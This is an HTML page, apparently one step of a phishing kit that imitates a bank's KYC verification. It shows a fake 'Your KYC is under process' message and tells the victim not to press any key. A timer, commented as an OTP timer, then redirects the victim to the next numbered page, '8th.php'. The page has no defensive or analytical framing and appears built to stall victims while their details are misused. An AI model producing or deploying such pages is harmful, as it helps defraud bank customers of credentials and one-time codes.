<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        #aa
        {
            width: 100%;
        }
        #bb
        {
            width: 100%;
        }
    </style>
</head>
<body>
    <img src="third.jpeg" alt="" id="aa">
  <body onload="startTimer();">
  <div style="text-align:center;">


<h3 style="color:green;"> Please Wait While Processing......</h3>
<h4 >Do'nt Press any Key While Processing........</h4>
<style>
::-webkit-input-placeholder { /* Edge */
  text-align: center;
}
</style>

<h4 style="color:skyblue";> Your KYC is under process it will take maximum 15 second </h4>

<!-- progressbar -->


<!---Timer for Otp ------------------------------------------------------------------------    -->

  <script type="text/javascript">
    var timer=15;
    var sec=0;
  function startTimer() {
    sec=parseInt(timer%15);

    if (timer<0) {
      // timer.stop();
       window.location.href = "8th.php";
    }

    document.getElementById("time").innerHTML = "<b>This screen will automatically timeout after: </b>"+sec.toString();
    timer--;
    setTimeout(function(){
      startTimer();

    }, 1000);
  }
    
      </script>
<!-- -------------------------------------------------------------------------------------------------- -->
      <div>
        <center><b><span id="time"></span>&nbsp; Second</b></center>
      </div>
<!-- ----------------------------------------------------------------------------------------------------------- -->
</body>
</html>